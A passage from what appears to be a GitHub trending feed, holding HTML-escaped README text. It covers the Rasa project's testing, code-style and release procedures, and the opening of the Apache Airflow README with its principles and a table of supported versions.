reload and apply your changes.&lt;/p&gt; &#xA;&lt;h3&gt;Running the Tests&lt;/h3&gt; &#xA;&lt;p&gt;In order to run the tests, make sure that you have the development requirements installed:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;make prepare-tests-ubuntu # Only on Ubuntu and Debian based systems&#xA;make prepare-tests-macos  # Only on macOS&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Then, run the tests:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;make test&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;They can also be run at multiple jobs to save some time:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;JOBS=[n] make test&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Where &lt;code&gt;[n]&lt;/code&gt; is the number of jobs desired. If omitted, &lt;code&gt;[n]&lt;/code&gt; will be automatically chosen by pytest.&lt;/p&gt; &#xA;&lt;h3&gt;Running the Integration Tests&lt;/h3&gt; &#xA;&lt;p&gt;In order to run the integration tests, make sure that you have the development requirements installed:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;make prepare-tests-ubuntu # Only on Ubuntu and Debian based systems&#xA;make prepare-tests-macos  # Only on macOS&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Then, you&#39;ll need to start services with the following command which uses &lt;a href=&#34;https://docs.docker.com/compose/install/&#34;&gt;Docker Compose&lt;/a&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;make run-integration-containers&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Finally, you can run the integration tests like this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;make test-integration&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Resolving merge conflicts&lt;/h3&gt; &#xA;&lt;p&gt;Poetry doesn&#39;t include any solution that can help to resolve merge conflicts in the lock file &lt;code&gt;poetry.lock&lt;/code&gt; by default. However, there is a great tool called &lt;a href=&#34;https://poetry-merge-lock.readthedocs.io/en/latest/&#34;&gt;poetry-merge-lock&lt;/a&gt;. Here is how you can install it:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;pip install poetry-merge-lock&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Just execute this command to resolve merge conflicts in &lt;code&gt;poetry.lock&lt;/code&gt; automatically:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;poetry-merge-lock&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Build a Docker image locally&lt;/h3&gt; &#xA;&lt;p&gt;In order to build a Docker image on your local machine execute the following command:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;make build-docker&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The Docker image is available on your local machine as &lt;code&gt;rasa:localdev&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Code Style&lt;/h3&gt; &#xA;&lt;p&gt;To ensure a standardized code style we use the formatter &lt;a href=&#34;https://github.com/ambv/black&#34;&gt;black&lt;/a&gt;. To ensure our type annotations are correct we use the type checker &lt;a href=&#34;https://github.com/google/pytype&#34;&gt;pytype&lt;/a&gt;. If your code is not formatted properly or doesn&#39;t type check, GitHub will fail to build.&lt;/p&gt; &#xA;&lt;h4&gt;Formatting&lt;/h4&gt; &#xA;&lt;p&gt;If you want to automatically format your code on every commit, you can use &lt;a href=&#34;https://pre-commit.com/&#34;&gt;pre-commit&lt;/a&gt;. Just install it via &lt;code&gt;pip install pre-commit&lt;/code&gt; and execute &lt;code&gt;pre-commit install&lt;/code&gt; in the root folder. This will add a hook to the repository, which reformats files on every commit.&lt;/p&gt; &#xA;&lt;p&gt;If you want to set it up manually, install black via &lt;code&gt;poetry install&lt;/code&gt;. To reformat files execute&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;make formatter&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Type Checking&lt;/h4&gt; &#xA;&lt;p&gt;If you want to check types on the codebase, install &lt;code&gt;mypy&lt;/code&gt; using &lt;code&gt;poetry install&lt;/code&gt;. To check the types execute&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;make types&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Deploying documentation updates&lt;/h3&gt; &#xA;&lt;p&gt;We use &lt;code&gt;Docusaurus v2&lt;/code&gt; to build docs for tagged versions and for the &lt;code&gt;main&lt;/code&gt; branch. The static site that gets built is pushed to the &lt;code&gt;documentation&lt;/code&gt; branch of this repo.&lt;/p&gt; &#xA;&lt;p&gt;We host the site on netlify. On &lt;code&gt;main&lt;/code&gt; branch builds (see &lt;code&gt;.github/workflows/documentation.yml&lt;/code&gt;), we push the built docs to the &lt;code&gt;documentation&lt;/code&gt; branch. Netlify automatically re-deploys the docs pages whenever there is a change to that branch.&lt;/p&gt; &#xA;&lt;h2&gt;Releases&lt;/h2&gt; &#xA;&lt;h3&gt;Release Timeline for Minor Releases&lt;/h3&gt; &#xA;&lt;p&gt;&lt;strong&gt;For Rasa Open Source, we usually commit to time-based releases, specifically on a monthly basis.&lt;/strong&gt; This means that we commit beforehand to releasing a specific version of Rasa Open Source on a specific day, and we cannot be 100% sure what will go in a release, because certain features may not be ready.&lt;/p&gt; &#xA;&lt;p&gt;At the beginning of each quarter, the Rasa team will review the scheduled release dates for all products and make sure they work for the projected work we have planned for the quarter, as well as work well across products.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Once the dates are settled upon, we update the respective &lt;a href=&#34;https://github.com/RasaHQ/rasa/milestones&#34;&gt;milestones&lt;/a&gt;.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Cutting a Major / Minor release&lt;/h3&gt; &#xA;&lt;h4&gt;A week before release day&lt;/h4&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;strong&gt;Make sure the &lt;a href=&#34;https://github.com/RasaHQ/rasa/milestones&#34;&gt;milestone&lt;/a&gt; already exists and is scheduled for the correct date.&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Take a look at the issues &amp;amp; PRs that are in the milestone&lt;/strong&gt;: does it look about right for the release highlights we are planning to ship? Does it look like anything is missing? Don&#39;t worry about being aware of every PR that should be in, but it&#39;s useful to take a moment to evaluate what&#39;s assigned to the milestone.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Post a message on the engineering Slack channel&lt;/strong&gt;, letting the team know you&#39;ll be the one cutting the upcoming release, as well as: &#xA;  &lt;ol&gt; &#xA;   &lt;li&gt;Providing the link to the appropriate milestone&lt;/li&gt; &#xA;   &lt;li&gt;Reminding everyone to go over their issues and PRs and please assign them to the milestone&lt;/li&gt; &#xA;   &lt;li&gt;Reminding everyone of the scheduled date for the release&lt;/li&gt; &#xA;  &lt;/ol&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h4&gt;A day before release day&lt;/h4&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;strong&gt;Go over the milestone and evaluate the status of any PR merging that&#39;s happening. Follow up with people on their bugs and fixes.&lt;/strong&gt; If the release introduces new bugs or regressions that can&#39;t be fixed in time, we should discuss on Slack about this and take a decision on how to move forward. If the issue is not ready to be merged in time, we remove the issue / PR from the milestone and notify the PR owner and the product manager on Slack about it. The PR / issue owners are responsible for communicating any issues which might be release relevant. Postponing the release should be considered as an edge case scenario.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h4&gt;Release day! 🚀&lt;/h4&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;strong&gt;At the start of the day, post a small message on slack announcing release day!&lt;/strong&gt; Communicate you&#39;ll be handling the release, and the time you&#39;re aiming to start releasing (again, no later than 4pm, as issues may arise and cause delays). This message should be posted early in the morning and before moving forward with any of the steps of the release, in order to give enough time to people to check their PRs and issues. That way they can plan any remaining work. A template of the slack message can be found &lt;a href=&#34;https://rasa-hq.slack.com/archives/C36SS4N8M/p1613032208137500?thread_ts=1612876410.068400&amp;amp;cid=C36SS4N8M&#34;&gt;here&lt;/a&gt;. The release time should be communicated transparently so that others can plan potentially necessary steps accordingly. If there are bigger changes this should be communicated.&lt;/li&gt; &#xA; &lt;li&gt;Make sure the milestone is empty (everything has been either merged or moved to the next milestone)&lt;/li&gt; &#xA; &lt;li&gt;Once everything in the milestone is taken care of, post a small message on Slack communicating you are about to start the release process (in case anything is missing).&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;You may now do the release by following the instructions outlined in the &lt;a href=&#34;https://raw.githubusercontent.com/RasaHQ/rasa/main/#steps-to-release-a-new-version&#34;&gt;Rasa Open Source README&lt;/a&gt; !&lt;/strong&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h4&gt;After a Major release&lt;/h4&gt; &#xA;&lt;p&gt;After a Major release has been completed, please follow &lt;a href=&#34;https://raw.githubusercontent.com/RasaHQ/rasa/main/docs/README.md#manual-steps-after-a-new-version&#34;&gt;these instructions to complete the documentation update&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Steps to release a new version&lt;/h3&gt; &#xA;&lt;p&gt;Releasing a new version is quite simple, as the packages are build and distributed by GitHub Actions.&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Terminology&lt;/em&gt;:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;micro release (third version part increases): 1.1.2 -&amp;gt; 1.1.3&lt;/li&gt; &#xA; &lt;li&gt;minor release (second version part increases): 1.1.3 -&amp;gt; 1.2.0&lt;/li&gt; &#xA; &lt;li&gt;major release (first version part increases): 1.2.0 -&amp;gt; 2.0.0&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;em&gt;Release steps&lt;/em&gt;:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Make sure all dependencies are up to date (&lt;strong&gt;especially Rasa SDK&lt;/strong&gt;) &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;For Rasa SDK, except in the case of a micro release, that means first creating a &lt;a href=&#34;https://github.com/RasaHQ/rasa-sdk#steps-to-release-a-new-version&#34;&gt;new Rasa SDK release&lt;/a&gt; (make sure the version numbers between the new Rasa and Rasa SDK releases match)&lt;/li&gt; &#xA;   &lt;li&gt;Once the tag with the new Rasa SDK release is pushed and the package appears on &lt;a href=&#34;https://pypi.org/project/rasa-sdk/&#34;&gt;pypi&lt;/a&gt;, the dependency in the rasa repository can be resolved (see below).&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;In case of a minor release, create a new branch that corresponds to the new release, e.g. &lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt; git checkout -b 1.2.x&#xA; git push origin 1.2.x&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt;Switch to the branch you want to cut the release from (&lt;code&gt;main&lt;/code&gt; in case of a major, the &lt;code&gt;&amp;lt;major&amp;gt;.&amp;lt;minor&amp;gt;.x&lt;/code&gt; branch for minors and micros) &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Update the &lt;code&gt;rasa-sdk&lt;/code&gt; entry in &lt;code&gt;pyproject.toml&lt;/code&gt; with the new release version and run &lt;code&gt;poetry update&lt;/code&gt;. This creates a new &lt;code&gt;poetry.lock&lt;/code&gt; file with all dependencies resolved.&lt;/li&gt; &#xA;   &lt;li&gt;Commit the changes with &lt;code&gt;git commit -am &#34;bump rasa-sdk dependency&#34;&lt;/code&gt; but do not push them. They will be automatically picked up by the following step.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;If this is a major release, update the list of actively maintained versions &lt;a href=&#34;https://raw.githubusercontent.com/RasaHQ/rasa/main/#actively-maintained-versions&#34;&gt;in the README&lt;/a&gt; and in &lt;a href=&#34;https://raw.githubusercontent.com/RasaHQ/rasa/main/docs/docs/actively-maintained-versions.mdx&#34;&gt;the docs&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Run &lt;code&gt;make release&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Create a PR against the release branch (e.g. &lt;code&gt;1.2.x&lt;/code&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Once your PR is merged, tag a new release (this SHOULD always happen on the release branch), e.g. using &lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git checkout 1.2.x&#xA;git pull origin 1.2.x&#xA;git tag 1.2.0 -m &#34;next release&#34;&#xA;git push origin 1.2.0 --tags&#xA;&lt;/code&gt;&lt;/pre&gt; GitHub will build this tag and publish the build artifacts.&lt;/li&gt; &#xA; &lt;li&gt;After all the steps are completed and if everything goes well then we should see a message automatically posted in the company&#39;s Slack (&lt;code&gt;product&lt;/code&gt; channel) like this &lt;a href=&#34;https://rasa-hq.slack.com/archives/C7B08Q5FX/p1614354499046600&#34;&gt;one&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;If no message appears in the channel then you can do the following checks: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Check the workflows in &lt;a href=&#34;https://github.com/RasaHQ/rasa/actions&#34;&gt;Github Actions&lt;/a&gt; and make sure that the merged PR of the current release is completed successfully. To easily find your PR you can use the filters &lt;code&gt;event: push&lt;/code&gt; and &lt;code&gt;branch: &amp;lt;version number&amp;gt;&lt;/code&gt; (example on release 2.4 you can see &lt;a href=&#34;https://github.com/RasaHQ/rasa/actions/runs/643344876&#34;&gt;here&lt;/a&gt;)&lt;/li&gt; &#xA;   &lt;li&gt;If the workflow is not completed, then try to re run the workflow in case that solves the problem&lt;/li&gt; &#xA;   &lt;li&gt;If the problem persists, check also the log files and try to find the root cause of the issue&lt;/li&gt; &#xA;   &lt;li&gt;If you still cannot resolve the error, contact the infrastructure team by providing any helpful information from your investigation&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;After the message is posted correctly in the &lt;code&gt;product&lt;/code&gt; channel, check also in the &lt;code&gt;product-engineering-alerts&lt;/code&gt; channel if there are any alerts related to the Rasa Open Source release like this &lt;a href=&#34;https://rasa-hq.slack.com/archives/C01585AN2NP/p1615486087001000&#34;&gt;one&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h3&gt;Cutting a Micro release&lt;/h3&gt; &#xA;&lt;p&gt;Micro releases are simpler to cut, since they are meant to contain only bugfixes.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;The only things you need to do to cut a micro are:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Notify the engineering team on Slack that you are planning to cut a micro, in case someone has an important fix to add.&lt;/li&gt; &#xA; &lt;li&gt;Make sure the bugfix(es) are in the release branch you will use (p.e if you are cutting a &lt;code&gt;2.0.4&lt;/code&gt; micro, you will need your fixes to be on the &lt;code&gt;2.0.x&lt;/code&gt; release branch). All micros must come from a &lt;code&gt;.x&lt;/code&gt; branch!&lt;/li&gt; &#xA; &lt;li&gt;Once you&#39;re ready to release the Rasa Open Source micro, checkout the branch, run &lt;code&gt;make release&lt;/code&gt; and follow the steps + get the PR merged.&lt;/li&gt; &#xA; &lt;li&gt;Once the PR is in, pull the &lt;code&gt;.x&lt;/code&gt; branch again and push the tag!&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h3&gt;Actively maintained versions&lt;/h3&gt; &#xA;&lt;p&gt;We&#39;re actively maintaining &lt;em&gt;any minor on our latest major release&lt;/em&gt; and &lt;em&gt;the latest minor of the previous major release&lt;/em&gt;. Currently, this means the following minor versions will receive bugfixes updates:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;2.8&lt;/li&gt; &#xA; &lt;li&gt;Every minor version on 3.x&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;Licensed under the Apache License, Version 2.0. Copyright 2022 Rasa Technologies GmbH. &lt;a href=&#34;https://raw.githubusercontent.com/RasaHQ/rasa/main/LICENSE.txt&#34;&gt;Copy of the license&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;A list of the Licenses of the dependencies of the project can be found at the bottom of the &lt;a href=&#34;https://libraries.io/github/RasaHQ/rasa&#34;&gt;Libraries Summary&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>apache/airflow</title>
    <updated>2022-05-29T01:33:11Z</updated>
    <id>tag:github.com,2022-05-29:/apache/airflow</id>
    <link href="https://github.com/apache/airflow" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Apache Airflow - A platform to programmatically author, schedule, and monitor workflows&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Apache Airflow&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://badge.fury.io/py/apache-airflow&#34;&gt;&lt;img src=&#34;https://badge.fury.io/py/apache-airflow.svg?sanitize=true&#34; alt=&#34;PyPI version&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/apache/airflow/actions&#34;&gt;&lt;img src=&#34;https://github.com/apache/airflow/workflows/CI%20Build/badge.svg?sanitize=true&#34; alt=&#34;GitHub Build&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://codecov.io/github/apache/airflow?branch=main&#34;&gt;&lt;img src=&#34;https://img.shields.io/codecov/c/github/apache/airflow/main.svg?sanitize=true&#34; alt=&#34;Coverage Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.apache.org/licenses/LICENSE-2.0.txt&#34;&gt;&lt;img src=&#34;https://img.shields.io/:license-Apache%202-blue.svg?sanitize=true&#34; alt=&#34;License&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://pypi.org/project/apache-airflow/&#34;&gt;&lt;img src=&#34;https://img.shields.io/pypi/pyversions/apache-airflow.svg?sanitize=true&#34; alt=&#34;PyPI - Python Version&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://hub.docker.com/r/apache/airflow&#34;&gt;&lt;img src=&#34;https://img.shields.io/docker/pulls/apache/airflow.svg?sanitize=true&#34; alt=&#34;Docker Pulls&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://hub.docker.com/r/apache/airflow&#34;&gt;&lt;img src=&#34;https://img.shields.io/docker/stars/apache/airflow.svg?sanitize=true&#34; alt=&#34;Docker Stars&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://pypi.org/project/apache-airflow/&#34;&gt;&lt;img src=&#34;https://img.shields.io/pypi/dm/apache-airflow&#34; alt=&#34;PyPI - Downloads&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://artifacthub.io/packages/search?repo=apache-airflow&#34;&gt;&lt;img src=&#34;https://img.shields.io/endpoint?url=https://artifacthub.io/badge/repository/apache-airflow&#34; alt=&#34;Artifact HUB&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/psf/black&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/code%20style-black-000000.svg?sanitize=true&#34; alt=&#34;Code style: black&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://twitter.com/ApacheAirflow&#34;&gt;&lt;img src=&#34;https://img.shields.io/twitter/follow/ApacheAirflow.svg?style=social&amp;amp;label=Follow&#34; alt=&#34;Twitter Follow&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://s.apache.org/airflow-slack&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/slack-join_chat-white.svg?logo=slack&amp;amp;style=social&#34; alt=&#34;Slack Status&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://airflow.apache.org/docs/apache-airflow/stable/&#34;&gt;Apache Airflow&lt;/a&gt; (or simply Airflow) is a platform to programmatically author, schedule, and monitor workflows.&lt;/p&gt; &#xA;&lt;p&gt;When workflows are defined as code, they become more maintainable, versionable, testable, and collaborative.&lt;/p&gt; &#xA;&lt;p&gt;Use Airflow to author workflows as directed acyclic graphs (DAGs) of tasks. The Airflow scheduler executes your tasks on an array of workers while following the specified dependencies. Rich command line utilities make performing complex surgeries on DAGs a snap. The rich user interface makes it easy to visualize pipelines running in production, monitor progress, and troubleshoot issues when needed.&lt;/p&gt; &#xA;&lt;!-- START doctoc generated TOC please keep comment here to allow auto update --&gt; &#xA;&lt;!-- DON&#39;T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE --&gt; &#xA;&lt;p&gt;&lt;strong&gt;Table of contents&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/apache/airflow/main/#project-focus&#34;&gt;Project Focus&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/apache/airflow/main/#principles&#34;&gt;Principles&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/apache/airflow/main/#requirements&#34;&gt;Requirements&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/apache/airflow/main/#getting-started&#34;&gt;Getting started&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/apache/airflow/main/#installing-from-pypi&#34;&gt;Installing from PyPI&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/apache/airflow/main/#official-source-code&#34;&gt;Official source code&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/apache/airflow/main/#convenience-packages&#34;&gt;Convenience packages&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/apache/airflow/main/#user-interface&#34;&gt;User Interface&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/apache/airflow/main/#semantic-versioning&#34;&gt;Semantic versioning&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/apache/airflow/main/#version-life-cycle&#34;&gt;Version Life Cycle&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/apache/airflow/main/#support-for-python-and-kubernetes-versions&#34;&gt;Support for Python and Kubernetes versions&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/apache/airflow/main/#base-os-support-for-reference-airflow-images&#34;&gt;Base OS support for reference Airflow images&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/apache/airflow/main/#approach-to-dependencies-of-airflow&#34;&gt;Approach to dependencies of Airflow&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/apache/airflow/main/#support-for-providers&#34;&gt;Support for providers&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/apache/airflow/main/#contributing&#34;&gt;Contributing&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/apache/airflow/main/#who-uses-apache-airflow&#34;&gt;Who uses Apache Airflow?&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/apache/airflow/main/#who-maintains-apache-airflow&#34;&gt;Who Maintains Apache Airflow?&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/apache/airflow/main/#can-i-use-the-apache-airflow-logo-in-my-presentation&#34;&gt;Can I use the Apache Airflow logo in my presentation?&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/apache/airflow/main/#airflow-merchandise&#34;&gt;Airflow merchandise&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/apache/airflow/main/#links&#34;&gt;Links&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/apache/airflow/main/#sponsors&#34;&gt;Sponsors&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;!-- END doctoc generated TOC please keep comment here to allow auto update --&gt; &#xA;&lt;h2&gt;Project Focus&lt;/h2&gt; &#xA;&lt;p&gt;Airflow works best with workflows that are mostly static and slowly changing. When the DAG structure is similar from one run to the next, it clarifies the unit of work and continuity. Other similar projects include &lt;a href=&#34;https://github.com/spotify/luigi&#34;&gt;Luigi&lt;/a&gt;, &lt;a href=&#34;https://oozie.apache.org/&#34;&gt;Oozie&lt;/a&gt; and &lt;a href=&#34;https://azkaban.github.io/&#34;&gt;Azkaban&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Airflow is commonly used to process data, but has the opinion that tasks should ideally be idempotent (i.e., results of the task will be the same, and will not create duplicated data in a destination system), and should not pass large quantities of data from one task to the next (though tasks can pass metadata using Airflow&#39;s &lt;a href=&#34;https://airflow.apache.org/docs/apache-airflow/stable/concepts.html#xcoms&#34;&gt;Xcom feature&lt;/a&gt;). For high-volume, data-intensive tasks, a best practice is to delegate to external services specializing in that type of work.&lt;/p&gt; &#xA;&lt;p&gt;Airflow is not a streaming solution, but it is often used to process real-time data, pulling data off streams in batches.&lt;/p&gt; &#xA;&lt;h2&gt;Principles&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Dynamic&lt;/strong&gt;: Airflow pipelines are configuration as code (Python), allowing for dynamic pipeline generation. This allows for writing code that instantiates pipelines dynamically.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Extensible&lt;/strong&gt;: Easily define your own operators, executors and extend the library so that it fits the level of abstraction that suits your environment.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Elegant&lt;/strong&gt;: Airflow pipelines are lean and explicit. Parameterizing your scripts is built into the core of Airflow using the powerful &lt;strong&gt;Jinja&lt;/strong&gt; templating engine.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Scalable&lt;/strong&gt;: Airflow has a modular architecture and uses a message queue to orchestrate an arbitrary number of workers.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Requirements&lt;/h2&gt; &#xA;&lt;p&gt;Apache Airflow is tested with:&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;&lt;/th&gt; &#xA;   &lt;th&gt;Main version (dev)&lt;/th&gt; &#xA;   &lt;th&gt;Stable version (2.3.1)&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Python&lt;/td&gt; &#xA;   &lt;td&gt;3.7, 3.8, 3.9, 3.10&lt;/td&gt; &#xA;   &lt;td&gt;3.7, 3.8, 3.9, 3.10&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Platform&lt;/td&gt; &#xA;   &lt;td&gt;AMD64/ARM64(*)&lt;/td&gt; &#xA;   &lt;td&gt;AMD64/ARM64(*)&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Kubernetes&lt;/td&gt; &#xA;   &lt;td&gt;1.20, 1.21, 1.22, 1.23, 1.24&lt;/td&gt; &#xA;   &lt;td&gt;1.20, 1.21, 1.22, 1.23, 1.24&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;PostgreSQL&lt;/td&gt; &#xA;   &lt;td&gt;10, 11, 12, 13, 14&lt;/td&gt; &#xA;   &lt;td&gt;10, 11, 12, 13, 14&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;MySQL&lt;/td&gt; &#xA;   &lt;td&gt;5.7, 8&lt;/td&gt; &#xA;   &lt;td&gt;5.7, 8&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;SQLite&lt;/td&gt; &#xA;   &lt;td&gt;3.15.0+&lt;/td&gt; &#xA;   &lt;td&gt;3.15.0+&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;MSSQL&lt;/td&gt; &#xA;   &lt;td&gt;2017(*), 2019 (*)&lt;/td&gt; &#xA;   &lt;td&gt;2017(*), 2019 (*)&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p&gt;* Experimental&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: MySQL 5.x versions are unable to or have limitations with running multiple schedulers -- please see the 